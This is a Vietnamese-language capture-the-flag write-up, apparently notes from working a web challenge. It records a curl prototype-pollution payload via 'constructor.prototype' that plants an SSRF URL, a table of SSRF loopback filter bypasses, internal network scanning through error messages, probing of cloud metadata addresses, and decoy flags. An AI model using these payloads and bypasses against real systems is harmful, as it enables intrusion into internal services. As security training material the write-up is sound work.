## 1. Vector đúng đã xác nhận lại: `constructor.prototype`

Lưu ý quan trọng khắc phục nhận định ở `2.md`: `__proto__` top-level **bị chặn 400**. Vector thực sự là:

```bash
curl -X PUT http://91.107.189.166:3000/api/theme \
  -H "Content-Type: application/json" -b cookies.txt \
  -d '{"constructor":{"prototype":{"ogImage":"http://[::1]:3000/<path>"}}}'
```

→ HTTP 200. `ogImage` thành property kế thừa trên `Object.prototype` toàn cục, media pipeline vẫn đọc.
Mọi lần "thành công" với `__proto__` trước đó thực chất là hưởng trạng thái polluted do `constructor.prototype` (V3) gây ra từ trước.

## 2. SSRF filter — bản đồ đầy đủ

| Bị chặn (`refused to fetch ... host not allowed`) | Lọt qua |
|---|---|
| `127.0.0.1`, `localhost` (mọi case, kèm trailing dot) | **`[::1]`** (IPv6 loopback) |
| `0.0.0.0`, `0/` | **`[::ffff:127.0.0.1]`** (IPv4-mapped) |
| `0x7f000001`, `2130706433`, `0177.0.0.1` (hex/decimal/octal) | hostname **`portalis`** → 172.18.0.3 |
| `file:`, `data:`, `https:` (chỉ http:) | IP nội bộ: `172.18.0.2`, `172.18.0.3` |
| userinfo `foo@127.0.0.1` | |

Filter normalize rất kỹ (case-insensitive, strip trailing dot). Schema check tường minh:
`https://` → lỗi `Protocol "https:" not supported. Expected "http:"`.

## 3. SSRF đọc body — cơ chế

Mọi response của app đều `text/plain` → pipeline luôn in:

```
HTTP <code> from <url> is not an image; preview: <TOÀN BỘ BODY>
```

→ Đọc được nội dung mọi endpoint nội bộ qua GET. Error message cũng là oracle:
`fetch failed: getaddrinfo ETIMEOUT <host>` / `connect ECONNREFUSED <ip>:<port>` — **leak IP đã resolve** (dùng để scan network).

## 4. Bản đồ network (quan trọng — đã quét đúng subnet)

Undici leak IP container qua error: fetch `http://portalis:9999/` → `ECONNREFUSED 172.18.0.3:9999`.

```
172.18.0.3  ← app (container "portalis") — hostname duy nhất resolve qua DNS nội bộ
172.18.0.2  ← CŨNG trả 200, fingerprint 404 "not found" = app (nginx 404 là HTML khác) → cùng app
172.18.0.1  ← gateway: DROP mọi port (iptables, không phải refused)
172.17.x.x  ← subnet khác, không liên quan (toàn refused)
```

- Port scan 57 port + dải mở rộng qua `[::1]` và `[::ffff:]`: **chỉ :3000 mở**
- Egress chặn tuyệt đối: `1.1.1.1`, `8.8.8.8` thẳng → ECONNREFUSED; mọi DNS ngoài ETIMEOUT
- 16 hostname service DNS enum: chỉ `portalis` resolve
- Cloud metadata (169.254.169.254, 169.254.170.2): refused
- **Kết luận (user xác nhận chủ đích của đề):** flag không cần ra khỏi app; network khóa chặn là by-design

## 5. Các vector đã LOẠI (chứng minh, không đoán)

### 5a. Fetch options không đọc từ prototype (hướng C — chết)

Differential crash-test: pollute `signal: "not-a-signal"` và `dispatcher: "x"` (giá trị sai kiểu — undici ném TypeError nếu được spread). Fetch vẫn chạy bình thường → app build fetch options riêng, cứng. Không thể nhét `method`/`headers` vào SSRF fetch.
Cũng thử vô hiệu: `method`, `fetchMethod`, `httpMethod`, `redirect`, `timeout`, `headers` (đủ kiểu key).

### 5b. Nhánh "image" của pipeline không thể kích hoạt (hướng A — chết)

- Static handler kín với path traversal (nginx normalize → 400/404)
- App trả `text/plain` cho **mọi** route — không tồn tại endpoint `image/*` nội bộ
- Egress chết → không fetch image ngoài về
- `Accept: image/*` lên `/api/preview` không đổi hành vi

### 5c. Không có bot internal

Đặt `ogImage` = `/api/flag`, đọc lại `/u/me` 3 lần cách 8s → diag không đổi (vẫn 403). Dòng `portal-diag` chỉ là fetch trực tiếp không header.

### 5d. Các vector khác

- `links[]`: deep-merge luôn biến array thành object `{"0":{...}}` → template không bao giờ render
- XSS `name`/`bio`: escape đúng; `accent` chèn vào `style=""` được nhưng quote bị escape thành `&quot;`
- Query param injection lên `/api/preview` (`?url=`, `?ogImage=`...): không ăn
- Pollute `avatarUrl`: không render (template own-only mọi field; chỉ fetch `ogImage` đọc prototype)
- `/u/:user` ăn mọi subpath (`/u/me/internal-metadata` = 200 template thường) — không phải route thật

## 7. Hai mồi đã biết

1. `/api/flag` + header `X-Internal: 1` → `flag{decoy_this_endpoint_is_a_trap}` — **flag mồi** (chữ nghĩa khai rõ)
2. `robots.txt` → `Disallow: /internal-metadata` — route **404 tuyệt đối** ở mọi điều kiện đã thử

Chi tiết gate `/api/flag`: so sánh giá trị **chuỗi `1` nghiêm ngặt** — `01`, `true`, `2`, `abc`, rỗng đều 403. Sự chính xác quá mức này gợi `1` có thể không phải giá trị "thật" của gate.

## 8. Tín hiệu còn sót (hướng tiếp theo)

1. **`Set-Cookie: sid=<32-hex>` trên MỌI response**, kể cả 404 — session layer chưa thăm dò. `/internal-metadata` có thể chờ **cookie đúng** chứ không phải header.
2. Schema note: `ogImage` "populated by the media pipeline" — pipeline là code nội bộ **ghi** ogImage server-side. Trigger của nó (route nội bộ/admin) chưa tìm thấy. `/api/schema` nói đó là reserved key duy nhất → không có key thứ hai để tìm.
3. `/internal-metadata` kháng cự 45 params + 33 headers + 74 paths + mọi method + mọi body — route có thật không im lặng đến vậy nếu chỉ chờ param/header. Khả năng cao nó chờ thứ ở **tầng khác** (session state, TLS cert, hoặc service sau gateway DROP).
